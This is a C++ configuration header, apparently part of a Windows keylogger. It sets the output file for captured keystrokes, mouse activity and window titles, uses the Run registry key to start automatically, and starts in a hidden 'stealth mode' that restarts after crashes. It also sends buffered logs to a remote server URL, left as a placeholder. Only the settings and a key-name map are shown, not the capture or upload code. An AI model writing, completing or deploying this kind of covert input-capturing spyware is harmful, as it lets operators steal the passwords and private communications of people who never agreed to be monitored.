#pragma once

#include <Windows.h>
#include <cstdint>
#include <string>
#include <unordered_map>

namespace configuration
{
    // File settings
    constexpr const wchar_t* out_file = L"logged.txt";
    
    // Registry settings
    constexpr const wchar_t* lp_sub_key = L"Software\\Microsoft\\Windows\\CurrentVersion\\Run";

    // Keyboard settings
    constexpr uint16_t keyboard_state_size = 256;
    constexpr uint8_t key_buffer_size = 4;
    constexpr uint8_t virtual_key_v = 0x56;
    
    // Mouse settings
    constexpr bool track_mouse_clicks = true;
    constexpr bool track_mouse_movement = true;
    constexpr uint16_t mouse_movement_interval_ms = 500; // Only log position every X ms
    
    // Remote logging settings
    constexpr bool remote_logging_enabled = true;
    constexpr const char* server_url = "https://your-logging-server.com/api/logs"; // Change to your actual server
    constexpr size_t remote_buffer_threshold = 1024; // Send logs when buffer reaches this size
    
    // Memory management
    constexpr size_t memory_check_interval_ms = 60000; // Check memory usage every minute
    constexpr size_t max_log_file_size_bytes = 10485760; 
    
    // Stealth settings
    constexpr bool start_in_stealth_mode = true;
    
    // Enhanced logging
    constexpr bool include_timestamps = true;
    constexpr bool include_window_titles = true;
    
    // Error handling
    constexpr bool enable_crash_recovery = true;
    constexpr uint16_t restart_delay_ms = 5000;

    const std::unordered_map<DWORD, std::wstring> key_codes
    {
        { VK_RETURN, L"\n" },
        { VK_ESCAPE, L"[ESCAPE]" },
        { VK_BACK, L"[BACKSPACE]" },
        { VK_TAB, L"[TAB]" },
        { VK_SPACE, L" " },
        { VK_CAPITAL, L"[CAPS]" },
        { VK_SHIFT, L"[SHIFT]" },
        { VK_CONTROL, L"[CTRL]" },
        { VK_MENU, L"[ALT]" },
        { VK_LWIN, L"[WIN]" },
        { VK_INSERT, L"[INS]" },
        { VK_DELETE, L"[DEL]" },
        { VK_HOME, L"[HOME]" },
        { VK_END, L"[END]" },
        { VK_PRIOR, L"[PGUP]" },
        { VK_NEXT, L"[PGDN]" },
        { VK_F1, L"[F1]" },
        { VK_F2, L"[F2]" },
        { VK_F3, L"[F3]" },
        { VK_F4, L"[F4]" },
        { VK_F5, L"[F5]" },
        { VK_F6, L"[F6]" },
        { VK_F7, L"[F7]" },
        { VK_F8, L"[F8]" },
        { VK_F9, L"[F9]" },
        { VK_F10, L"[F10]" },
        { VK_F11, L"[F11]" },
        { VK_F12, L"[F12]" }
    };
}
